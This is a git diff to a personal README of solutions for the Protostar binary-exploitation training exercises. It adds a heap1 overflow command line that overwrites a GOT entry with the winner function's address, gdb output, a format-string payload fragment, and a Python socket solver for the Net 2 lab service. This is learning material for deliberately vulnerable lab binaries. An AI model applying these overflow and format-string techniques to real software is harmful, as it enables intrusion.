@@ -1,6 +1,7 @@
-# Protostar Solutions
+b# Protostar Solutions
 - Inspired by Liveoverflow's solutions, meant to help me learn binary exploitation
 https://old.liveoverflow.com/binary_hacking/protostar/index.html
+https://github.com/z3tta/Exploit-Exercises-Protostar
 - Some were done by myself
 
 ## Stack 1
@@ -292,7 +293,7 @@ Python Script Code Breakdown
 debug = False
 
 part1 = 0x84b4 # Lower bits
-part2 = 0x0804 + 0x10000 # Upper bits + 0x10000
+part2 = 0x0804 + 0x10000 # Upper bits + 0x10000 (Overload)
 offset = 5
 
 payload = "AAAA"
@@ -348,4 +349,40 @@ strcpy(0x0804a018, NULL <unfinished ...>
 +++ killed by SIGSEGV +++
 ```
 
-win function address: `0x08048494`
+```
+(gdb) p winner
+$2 = {void (void)} 0x8048494 <winner>
+```
+
+```
+ /opt/protostar/bin/heap1 `python -c 'print "A"*20+"\x74\x97\x04\x08"'` `python -c 'print("\x94\x84\x04\x08")'`
+and we have a winner @ 1588376578
+```
+
+## Net 0
+http://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/17-Net0.md
+
+## Net 1
+https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/18-Net1.md
+
+## Net 2
+(Check Liveoverflow guide again)
+```
+import socket
+import struct
+
+s = socket.socket()
+s.connect(("192.168.56.101",2997))
+
+sum = 0
+for i in range(4):
+	data = s.recv(4)
+	data = "%d\n" % (struct.unpack('<i', data))
+	sum += int(data)
+
+s.send(struct.pack("<I", sum))
+print s.recv(1024)
+s.close()
+```
+
+## Net 3
